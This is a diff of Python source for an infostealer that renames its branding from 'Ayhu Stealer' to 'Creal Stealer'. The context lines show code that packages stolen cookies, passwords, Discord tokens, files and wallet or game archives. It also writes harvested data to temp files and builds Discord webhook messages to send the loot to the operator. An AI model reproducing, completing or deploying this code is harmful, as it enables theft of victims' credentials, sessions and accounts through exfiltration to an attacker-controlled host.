@@ -15,7 +15,7 @@ import random
 import re
 import subprocess
 
-#  Artonus & Ayhu
+#  THIS IS 1.1.6 VERSION
 #
 # 
 
@@ -330,7 +330,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "AYHU STEALER",
+                "text": "CREAL STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                 },
             "thumbnail": {
@@ -339,7 +339,7 @@ def uploadToken(token, path):
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
-        "username": "Ayhu Stealer",
+        "username": "Creal Stealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -367,16 +367,16 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "Ayhu | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [AyhuCookies.txt]({link})",
+                    "title": "Creal | Cookies Stealer",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [CrealCookies.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@AYHU STEALER",
+                        "text": "@CREAL STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                     }
                 }
             ],
-            "username": "AYHU",
+            "username": "CREAL",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -393,16 +393,16 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "Ayhu | Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [AyhuPassword.txt]({link})",
+                    "title": "Creal | Password Stealer",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [CrealPassword.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@AYHU STEALER",
+                        "text": "@CREAL STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                     }
                 }
             ],
-            "username": "AYHU",
+            "username": "CREAL",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -422,15 +422,15 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Ayhu | File Stealer"
+                    "name": "Creal | File Stealer"
                 },
                 "footer": {
-                    "text": "@AYHU STEALER",
+                    "text": "@CREAL STEALER",
                     "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                 }
                 }
             ],
-            "username": "AYHU",
+            "username": "CREAL",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -451,7 +451,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--AYHU STEALER BEST -->\n\n")
+        f.write(f"<--CREAL STEALER BEST -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -616,16 +616,16 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "AYHU Zips",
+            "title": "CREAL Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 15781403,
             "footer": {
-                "text": "@AYHU STEALER",
+                "text": "@CREAL STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
             }
             }
         ],
-        "username": "Ayhu Stealer",
+        "username": "Creal Stealer",
         "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
         "attachments": []
     }
